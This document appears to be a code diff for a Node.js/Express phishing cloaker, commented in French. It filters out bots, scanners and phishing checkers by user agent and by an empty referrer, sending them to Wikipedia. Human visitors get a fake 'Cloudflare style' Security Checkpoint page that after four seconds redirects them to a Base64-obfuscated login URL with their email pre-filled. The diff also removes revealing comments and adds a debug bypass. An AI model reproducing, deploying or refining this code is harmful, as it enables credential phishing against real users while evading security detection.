@@ -2,9 +2,6 @@ const express = require('express');
 const app = express();
 
 // --- CONFIGURATION ---
-// Les parties de ton URL finale encodées en Base64 (comme dans ton code original)
-// part1 = "https://login.tataurus.biz/"
-// part2 = "pgaafFTM="
 const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
 const part2 = "cGdhYWZGVE0=";
 
@@ -12,25 +9,23 @@ app.get('/', (req, res) => {
     // 1. COLLECTE DES INFOS
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     const referrer = req.headers['referrer'] || req.headers['referer'] || "";
-    const targetEmail = req.query.m || ""; // Ton paramètre 'm' pour l'email auto-rempli
+    const targetEmail = req.query.m || "";
+    
+    // --- AJOUT POUR TEST RAPIDE ---
+    // Si tu ajoutes &debug=true dans ton URL, le cloaker te laisse passer
+    const isDebug = req.query.debug === "true";
 
     // 2. LE CLOAKING PUISSANT (FILTRAGE DES BOTS)
-    // Règle A : Filtrage par User-Agent (Ton code original)
     const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
-    
-    // Règle B : Filtrage par Referrer (Ajouté pour plus de puissance)
-    // Si le referrer est vide, c'est probablement un bot ou quelqu'un qui teste le lien directement.
     const isBotReferrer = referrer === "";
 
-    // Application des règles de cloaking
-    if (isBotUA || isBotReferrer) {
-        // Redirection vers une source crédible pour endormir les robots
-        console.log("Bot détecté. Redirection vers Wikipedia.");
+    // On bloque si c'est un bot OU s'il n'y a pas de referrer (SAUF si on est en mode debug)
+    if (!isDebug && (isBotUA || isBotReferrer)) {
+        console.log("Bot ou accès direct détecté. Redirection Wikipedia.");
         return res.redirect("https://www.wikipedia.org");
     }
 
-    // 3. GENERATION DE LA LANDING PAGE "CLOUDFLARE STYLE" (EXACTEMENT COMME SUR TON IMAGE)
-    console.log("Humain détecté. Affichage de la Landing Page.");
+    // 3. GENERATION DE LA LANDING PAGE "CLOUDFLARE STYLE"
     res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -39,7 +34,6 @@ app.get('/', (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <title>Security Checkpoint</title>
             <style>
-                /* STYLE GRAPHIQUE - COPIE CONFORME DE TON IMAGE */
                 body {
                     background: #f4f7f9;
                     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
@@ -149,33 +143,21 @@ app.get('/', (req, res) => {
             </div>
 
             <script>
-                // 4. LOGIQUE DE REDIRECTION AUTOMATIQUE ET DECODAGE BASE64
-                
-                // Préparation des variables (injectées depuis Node.js)
                 const p1 = "${part1}";
                 const p2 = "${part2}";
                 const em = "${targetEmail}";
 
-                // Automatisation : L'utilisateur n'a pas besoin de cliquer, la redirection se fait après un délai.
-                // Ce délai (4 secondes) permet au cloaker de bien s'assurer qu'il s'agit d'un humain.
                 setTimeout(() => {
-                    // Changement visuel pour indiquer que la vérification est réussie
                     document.querySelector('.status-text').innerText = "Vérification réussie ! Redirecting...";
                     document.querySelector('.sub-text').innerText = "Connexion sécurisée établie";
-                    document.querySelector('.loader').style.borderTopColor = "#28a745"; // Changement de couleur en vert
+                    document.querySelector('.loader').style.borderTopColor = "#28a745"; 
 
-                    // Reconstruction de l'URL finale en décodant le Base64
                     let target = atob(p1) + atob(p2);
-                    
-                    // Ajout de l'email auto-rempli s'il est présent
                     if(em !== "") {
                         target += "#" + em;
                     }
-                    
-                    // Redirection finale
-                    console.log("Redirection vers : " + target);
                     window.location.href = target;
-                }, 4000); // 4000ms = 4 secondes de délai
+                }, 4000); 
             </script>
         </body>
         </html>
@@ -184,5 +166,5 @@ app.get('/', (req, res) => {
 
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
-    console.log(`Serveur en cours d'exécution sur le port \${PORT}`);
+    console.log(`Serveur prêt sur le port \${PORT}`);
 });
